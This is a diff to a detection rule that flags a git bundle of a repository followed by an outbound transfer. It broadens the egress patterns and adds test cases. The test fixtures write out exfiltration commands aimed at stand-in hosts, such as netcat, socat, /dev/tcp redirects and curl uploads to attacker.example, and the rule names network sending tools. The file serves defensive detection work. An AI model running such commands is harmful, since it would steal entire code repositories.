@@ -1,12 +1,17 @@
 id: git-bundle-then-egress
-version: 1
+spec: threat-rules/v1.2  # needed for e.command.parsed_commands
+version: 2
 title: Git history bundled then sent off-host
 description: >
   A session packs repository history into a single git bundle (git bundle create)
-  and then, within a short window, sends a file off-host via an outbound upload
-  (curl/wget body, scp/rsync to a remote, or netcat). A bundle is a complete,
+  and then, within a short window, sends data off-host: an HTTP client with a request
+  body or upload (curl/wget/httpie/xh), a raw socket sender (nc, ncat, netcat, socat
+  or a bash /dev/tcp redirect), or scp/sftp/rsync to a remote. A bundle is a complete,
   portable copy of a repo's objects and history, so bundling followed by egress is
   a clean whole-repository exfiltration shape that evades per-file read heuristics.
+  The egress command is read as bash, so a sender by any path, under sudo, timeout or
+  torsocks, or inside bash -c counts, and the same words in a quoted string do not; a
+  command line that does not parse falls back to matching its text.
 severity: high
 status: stable
 posture: detect
@@ -23,13 +28,28 @@ correlation:
       match: >
         e.event.action == "command.executed" &&
         e.command.command.matches("(?i)\\bgit\\b.*\\bbundle\\b\\s+create\\b")
+    # The sender check (s), the /dev/tcp check and the remote-copy check are the egress
+    # rules' shared definition; TestPackSharedEgressSender keeps every copy identical.
+    # curl and wget count only with a request body or upload; the other senders send
+    # what they read.
     - id: egress
       match: >
         e.event.action == "command.executed" && (
-          e.command.command.matches("(?i)\\b(curl|wget)\\b.*(-d|--data|--data-binary|-F|--form|--upload-file|-T)\\b") ||
-          e.command.command.matches("(?i)\\bscp\\b\\s+.*\\s[^ ]+@[^ ]+:") ||
-          e.command.command.matches("(?i)\\brsync\\b\\s+.*\\s[^ ]+@[^ ]+:") ||
-          e.command.command.matches("(?i)\\b(nc|ncat)\\b\\s")
+          e.command.parsed_commands.exists(s,
+            (s.name.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$") ||
+              s.name.matches("(?i)^(timeout|nice|ionice|stdbuf|doas|torsocks|proxychains4?)$") &&
+              s.argv.exists(a, a.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$"))) &&
+            (!s.argv.exists(a, a.matches("(?i)(^|/)(curl|wget)$")) ||
+              s.argv.exists(a, a.matches("^(-[a-zA-Z]*[dFT].*|--(data|form|upload-file|json|post-file|post-data|body-file|body-data)\\b.*)$"))) ||
+            (s.name.matches("(?i)^(scp|sftp|rsync)$") && s.argv_raw.exists(a, a.matches("^[\\x27\"]?[\\w.@-]+:")))) ||
+          (e.command.command.matches("[<>][&|]?\\s*/dev/(tcp|udp)/") &&
+            !e.command.parsed_commands.exists(w, !w.name.matches("(?i)^(ba|z|da|k)?sh$") &&
+              w.argv_raw.exists(a, a.matches("/dev/(tcp|udp)/")))) ||
+          (size(e.command.parsed_commands) == 0 && (
+            e.command.command.matches("(?i)\\b(curl|wget)\\b.*(-d|--data|--data-binary|-F|--form|--upload-file|-T)\\b") ||
+            e.command.command.matches("(?i)\\bscp\\b\\s+.*\\s[^ ]+@[^ ]+:") ||
+            e.command.command.matches("(?i)\\brsync\\b\\s+.*\\s[^ ]+@[^ ]+:") ||
+            e.command.command.matches("(?i)\\b(nc|ncat)\\b\\s")))
         )
 
 emit:
@@ -68,5 +88,106 @@ tests:
         session: { id: s1 }
       - event: { action: command.executed }
         command: { command: "curl https://api.example/health" }
+        session: { id: s1 }
+  - name: bundle_then_netcat
+    # The old check knew nc and ncat but not netcat or socat.
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "netcat 203.0.113.9 4444 < /tmp/r.bundle" }
+        session: { id: s1 }
+  - name: bundle_then_socat
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "socat -u FILE:/tmp/r.bundle TCP:203.0.113.9:4444" }
+        session: { id: s1 }
+  - name: bundle_then_dev_tcp
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "cat /tmp/r.bundle > /dev/tcp/203.0.113.9/4444" }
+        session: { id: s1 }
+  - name: bundle_then_sudo_absolute_path_curl
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "sudo /usr/bin/curl -T /tmp/r.bundle https://attacker.example/r" }
+        session: { id: s1 }
+  - name: bundle_then_rsync_host_without_user
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "rsync -a /tmp/r.bundle drop.example:/srv/" }
+        session: { id: s1 }
+  - name: bundle_then_nc_in_bash_c
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "bash -c 'nc 203.0.113.9 4444 < /tmp/r.bundle'" }
+        session: { id: s1 }
+  - name: bundle_then_unparseable_capture_falls_back_to_text
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "curl -T /tmp/r.bundle https://attacker.example/r )" }
+        session: { id: s1 }
+  - name: bundle_then_curl_download
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "curl -fsSL https://example.com/install.sh -o install.sh" }
+        session: { id: s1 }
+  - name: bundle_then_grep_for_nc
+    # The old check took any "nc " in the text for netcat.
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "grep -rn \"nc \" scripts" }
+        session: { id: s1 }
+  - name: bundle_then_commit_message_mentions_scp
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "git commit -m \"docs: scp the bundle to backup@host.example:/srv\"" }
+        session: { id: s1 }
+  - name: bundle_then_local_rsync
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git bundle create /tmp/r.bundle --all" }
+        session: { id: s1 }
+      - event: { action: command.executed }
+        command: { command: "rsync -a /tmp/r.bundle /mnt/backup/" }
         session: { id: s1 }
 
